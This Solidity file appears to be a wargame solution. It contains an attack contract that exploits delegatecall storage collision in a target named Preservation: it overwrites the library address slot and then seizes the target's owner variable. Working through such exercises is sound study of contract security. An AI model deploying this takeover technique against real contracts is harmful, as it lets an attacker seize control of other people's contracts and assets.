// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Preservation} from "./Preservation.sol";

contract PreservationHack {
    error AttackFailed();

    Preservation private immutable TARGET;

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor(address _target) {
        TARGET = Preservation(_target);
    }

    function attack() external {
        TARGET.setFirstTime(uint256(uint160(address(this))));
        TARGET.setFirstTime(uint256(uint160(msg.sender)));
        if (TARGET.owner() != msg.sender) revert AttackFailed();
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
